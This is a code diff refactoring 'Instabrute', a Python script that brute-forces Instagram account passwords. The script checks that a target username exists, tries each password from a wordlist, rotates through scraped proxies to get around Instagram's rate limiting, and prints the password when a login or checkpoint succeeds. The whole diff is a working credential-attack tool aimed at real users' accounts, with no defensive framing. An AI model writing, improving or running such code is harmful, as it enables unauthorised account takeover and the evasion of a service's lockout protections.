@@ -28,8 +28,8 @@ if not os.path.exists(args.passwords_file):
 def cleanList(items):
 	newList = []
 	for x in items:
-		if not (x == None or x == ''):
-			if not x in newList:
+		if x is not None and x != '':
+			if x not in newList:
 				newList.append(x)
 	return newList
 
@@ -67,7 +67,7 @@ asyncio.get_event_loop().run_until_complete(asyncio.gather(Broker(proxies).find(
 #find proxy
 def setProxy():
 	for proxy in proxies_list:
-		print('[*] Proxy: %s' % proxy)
+		print(f'[*] Proxy: {proxy}')
 		proxies_list.remove(proxy)
 		return True
 
@@ -85,13 +85,8 @@ class Instabrute():
 		self.attempts = 0 
 
 	def userExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
-		if r.status_code == 404:
-			return False
-		elif r.status_code == 200:
-			return True
-		else:
-			return False
+		r = requests.get(f'https://www.instagram.com/{self.username}/?__a=1')
+		return r.status_code == 200
 
 	def _next(self):
 		if self.attempts % 15 == 0 and self.attempts != 0:
@@ -135,9 +130,9 @@ class Instabrute():
 
 		if 'authenticated' in r.text:
 			if r.json()['authenticated']:
-				exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
-				#update csrf token after login try (if you want to keep the session)
-				#sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+				exit(f'[{str(self.attempts + 1)}] Yay, the password is "{self.passwords[0]}"')
+						#update csrf token after login try (if you want to keep the session)
+						#sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 			else:
 				print ('[%s] Can\'t login with "%s"' % (str(self.attempts+1), self.passwords[0]))
 
@@ -145,19 +140,17 @@ class Instabrute():
 
 				#try the next password
 				self._next()
-		else:
-			if 'message' in r.text:
-				if r.json()['message'] == 'Please wait a few minutes before you try again.':
-					print ('[MESSAGE] Please wait a few minutes before you try again.')
-					countdown(60*15)
-					setProxy()
-					pass #Do you want to wait or use proxy?
-				elif r.json()['message'] == 'checkpoint_required':
-					exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
-				else:
-					print ('[MESSAGE] %s' % r.json()['message'])
+		elif 'message' in r.text:
+			if r.json()['message'] == 'Please wait a few minutes before you try again.':
+				print ('[MESSAGE] Please wait a few minutes before you try again.')
+				countdown(60*15)
+				setProxy()
+			elif r.json()['message'] == 'checkpoint_required':
+				exit(f'[{str(self.attempts + 1)}] Yay, the password is "{self.passwords[0]}"')
 			else:
-				print (r.text)
+				print(f"[MESSAGE] {r.json()['message']}")
+		else:
+			print (r.text)
 
 setProxy()
 #main action
@@ -167,7 +160,7 @@ with codecs.open(args.passwords_file, 'r', 'utf-8') as file:
 		exit('[*] The file is empty')
 	else:
 		passwords = cleanList(passwords)
-		print ('[*] %s passwords loaded successfully' % len(passwords))
+		print(f'[*] {len(passwords)} passwords loaded successfully')
 
 bruteforce = Instabrute(args.username, passwords)
 bruteforce.login()
